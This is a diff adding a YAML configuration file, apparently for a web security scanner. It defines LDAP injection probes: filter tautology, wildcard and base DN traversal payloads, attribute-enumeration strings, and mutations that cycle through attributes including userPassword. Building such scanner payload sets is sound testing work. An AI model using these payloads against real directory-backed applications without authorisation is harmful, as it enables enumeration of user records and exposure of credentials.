@@ -1,0 +1,39 @@
+family_id: ldap_injection
+description: >-
+  LDAP injection curriculum probes (CWE-90). AND/OR filter manipulation,
+  wildcard injection, Base DN traversal, and attribute enumeration.
+cwe_ids: [90]
+owasp_top10:
+  - 'A03:2021'
+risk_level: high
+requires_approval: false
+oast_required: false
+payloads:
+  - id: ldap_filter_tautology
+    template: "*)(|(uid=*"
+    confidence: suspected
+    notes: LDAP filter tautology; closes existing filter and opens OR with wildcard match-all.
+  - id: ldap_wildcard_injection
+    template: "*)(&(objectClass=*)"
+    confidence: suspected
+    notes: Wildcard AND filter injection; enumerates all objectClass entries via blind match.
+  - id: ldap_base_traversal
+    template: "*)(|(dn=*"
+    confidence: suspected
+    notes: Base DN traversal; leaks full DN structure through differential filter responses.
+  - id: ldap_attribute_enum
+    template: "*)(|(cn=*)(sn=*)(mail=*)(ou=*"
+    confidence: suspected
+    notes: Attribute enumeration probe; wildcard tests multiple common LDAP attribute names.
+mutations:
+  - name: attribute_rotator
+    description: Cycle through CN, SN, mail, telephoneNumber, userPassword LDAP attributes.
+  - name: operator_swap
+    description: Swap between | (OR) and & (AND) filter combinator operators.
+encodings:
+  - name: identity
+    stages: []
+    description: Raw LDAP filter string in search-form context.
+  - name: url_only
+    stages: [url]
+    description: URL-encoded for LDAP filters in query-string parameters.
